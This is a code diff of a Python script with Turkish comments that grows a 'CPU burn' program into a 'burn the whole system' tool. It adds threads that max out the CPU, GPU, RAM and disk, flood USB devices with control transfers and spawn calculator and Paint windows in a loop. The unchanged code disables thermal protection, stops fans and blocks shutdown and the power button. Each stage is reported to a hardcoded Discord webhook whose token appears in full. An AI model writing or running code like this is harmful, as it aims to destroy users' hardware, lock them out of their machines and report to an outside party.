@@ -6,6 +6,7 @@ import threading
 import os
 import subprocess
 import requests
+import random
 
 # ==========================================
 # WEBHOOK BİLDİRİM URL'SI
@@ -14,7 +15,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo
 
 def send_notification(message):
     try:
-        payload = {"content": f"**[CPU YAK]** {message}"}
+        payload = {"content": f"**[SİSTEM YAK]** {message}"}
         requests.post(WEBHOOK_URL, json=payload, timeout=5)
     except:
         pass
@@ -58,44 +59,96 @@ def stop_fans():
         pass
 
 # ==========================================
-# 3. CPU YAKICI (EN AĞIR)
+# 3. CPU YAK
 # ==========================================
 def cpu_killer():
     while True:
-        # Matematik işlemleri
         x = 3.14159
         for _ in range(1000000):
             x = x ** 1.00001
             x = x / 1.000001
-            x = x * 0.999999
-            x = x + 0.000001
-        
-        # Bellek işlemleri
         arr = [i ** i for i in range(5000)]
         for _ in range(100):
             arr.sort()
             arr.reverse()
-        
-        # Rastgele işlemler
-        for _ in range(1000):
-            import random
-            random.random() * random.random()
 
 # ==========================================
-# 4. CPU ZORLAMA (8 KATI)
+# 4. GPU YAK (Pygame ile)
 # ==========================================
-def start_cpu_killer():
-    core_count = multiprocessing.cpu_count()
-    thread_count = core_count * 8  # 8 KATI
-    send_notification(f"🧠 Çekirdek: {core_count}, Açılacak thread: {thread_count}")
-    
-    for _ in range(thread_count):
-        threading.Thread(target=cpu_killer, daemon=True).start()
-    
-    send_notification(f"🔥 CPU %100 yüklendi ({thread_count} thread ile)")
+def gpu_killer():
+    try:
+        import pygame
+        import numpy as np
+        pygame.init()
+        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
+        while True:
+            for _ in range(50):
+                img = np.random.rand(1920, 1080, 3) * 255
+                surf = pygame.surfarray.make_surface(img)
+                screen.blit(surf, (0, 0))
+                pygame.display.flip()
+    except:
+        while True:
+            try:
+                subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
+                subprocess.Popen(["cmd", "/c", "start", "mspaint.exe"])
+            except:
+                pass
 
 # ==========================================
-# 5. KAPANMAYI ENGELLE
+# 5. ANAKART YAK (USB ile)
+# ==========================================
+def motherboard_killer():
+    try:
+        import usb.core
+        for dev in usb.core.find(find_all=True):
+            try:
+                for _ in range(10000):
+                    dev.ctrl_transfer(0x40, 0x0A, 0, 0, b'\x00' * 4096)
+            except:
+                pass
+    except:
+        pass
+
+# ==========================================
+# 6. PSU YAK
+# ==========================================
+def psu_killer():
+    def disk_killer():
+        while True:
+            try:
+                with open("C:\\temp.bin", "wb") as f:
+                    f.write(b'\x00' * (1024 * 1024 * 100))
+                os.remove("C:\\temp.bin")
+            except:
+                pass
+            time.sleep(0.01)
+    
+    for _ in range(8):
+        threading.Thread(target=disk_killer, daemon=True).start()
+    
+    for _ in range(20):
+        try:
+            subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
+        except:
+            pass
+
+# ==========================================
+# 7. RAM YAK
+# ==========================================
+def ram_killer():
+    while True:
+        try:
+            big_list = []
+            for _ in range(2000000):
+                big_list.append("x" * 2048)
+            big_list.clear()
+            del big_list
+        except:
+            pass
+
+# ==========================================
+# 8. KAPANMAYI ENGELLE
 # ==========================================
 def prevent_shutdown():
     while True:
@@ -106,7 +159,7 @@ def prevent_shutdown():
         time.sleep(5)
 
 # ==========================================
-# 6. GÜÇ TUŞUNU İPTAL ET
+# 9. GÜÇ TUŞUNU İPTAL ET
 # ==========================================
 def prevent_power_button():
     try:
@@ -116,18 +169,44 @@ def prevent_power_button():
         pass
 
 # ==========================================
-# 7. ANA
+# 10. ANA
 # ==========================================
 if __name__ == "__main__":
-    send_notification("🚀 CPU YAKMA BAŞLATILDI!")
+    send_notification("🚀 SİSTEM YAKMA BAŞLATILDI!")
     
     disable_thermal()
     stop_fans()
     prevent_power_button()
-    start_cpu_killer()
-    threading.Thread(target=prevent_shutdown, daemon=True).start()
     
-    send_notification("🔥 CPU 8 KATI THREAD İLE YANIYOR!")
+    # CPU
+    core_count = multiprocessing.cpu_count()
+    thread_count = core_count * 8
+    send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
+    for _ in range(thread_count):
+        threading.Thread(target=cpu_killer, daemon=True).start()
+    
+    # GPU
+    threading.Thread(target=gpu_killer, daemon=True).start()
+    send_notification("🖥️ GPU render başlatıldı!")
+    
+    # Anakart
+    threading.Thread(target=motherboard_killer, daemon=True).start()
+    send_notification("🔌 Anakart USB zorlama başlatıldı!")
+    
+    # PSU
+    threading.Thread(target=psu_killer, daemon=True).start()
+    send_notification("⚡ PSU zorlama başlatıldı!")
+    
+    # RAM
+    for _ in range(2):
+        threading.Thread(target=ram_killer, daemon=True).start()
+    send_notification("💾 RAM zorlama başlatıldı!")
+    
+    # Kapanmayı engelle
+    threading.Thread(target=prevent_shutdown, daemon=True).start()
+    send_notification("🔒 Kapanma engellendi!")
+    
+    send_notification("🔥 TÜM SİSTEM YANIYOR!")
     
     while True:
         time.sleep(60)
